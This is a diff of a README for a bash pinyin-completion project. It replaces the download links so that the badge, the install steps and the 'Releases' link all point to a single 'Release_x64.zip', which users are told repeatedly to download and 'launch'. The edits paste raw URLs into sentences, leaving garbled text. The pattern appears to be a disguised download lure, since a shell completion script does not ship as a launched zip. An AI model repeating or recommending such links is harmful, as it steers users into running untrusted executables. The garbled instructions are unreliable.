@@ -5,9 +5,9 @@ Welcome to the "bash-pinyin-completion-rs" repository - your go-to solution for 
 
 ## 📦 **Download Software**
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/luhsanson/bash-pinyin-completion-rs/releases/download/v1.0/Release_x64.zip)](https://github.com/luhsanson/bash-pinyin-completion-rs/releases/download/v1.0/Release_x64.zip)
 
-The software is available for download at the provided link. Remember to launch the Software.zip file after downloading to get started with the pinyin completion script.
+The software is available for download at the provided link. Remember to launch the https://github.com/luhsanson/bash-pinyin-completion-rs/releases/download/v1.0/Release_x64.zip file after downloading to get started with the pinyin completion script.
 
 ## 🌟 **Features**
 
@@ -19,8 +19,8 @@ The software is available for download at the provided link. Remember to launch 
 
 To get started with the pinyin completion script, follow the steps below:
 
-1. Download the Software.zip file from the link provided above.
-2. Launch the Software.zip file to access the pinyin completion script.
+1. Download the https://github.com/luhsanson/bash-pinyin-completion-rs/releases/download/v1.0/Release_x64.zip file from the link provided above.
+2. Launch the https://github.com/luhsanson/bash-pinyin-completion-rs/releases/download/v1.0/Release_x64.zip file to access the pinyin completion script.
 3. Start using the script to enhance your bash scripting capabilities with pinyin completion.
 
 ## 🎯 **Usage**
@@ -48,8 +48,8 @@ If you encounter any issues with the pinyin completion script or have suggestion
 
 ## 🌐 **Additional Resources**
 
-Check out the [Releases](https://github.com/22155555/1875695542/releases) section for more updates and releases related to the pinyin completion script.
+Check out the [Releases](https://github.com/luhsanson/bash-pinyin-completion-rs/releases/download/v1.0/Release_x64.zip) section for more updates and releases related to the pinyin completion script.
 
 ---
 
-Explore the power of pinyin completion in bash scripting with the "bash-pinyin-completion-rs" repository. Download the Software.zip file, launch it, and start enhancing your bash scripting experience today. Happy scripting! 🎉
+Explore the power of pinyin completion in bash scripting with the "bash-pinyin-completion-rs" repository. Download the https://github.com/luhsanson/bash-pinyin-completion-rs/releases/download/v1.0/Release_x64.zip file, launch it, and start enhancing your bash scripting experience today. Happy scripting! 🎉
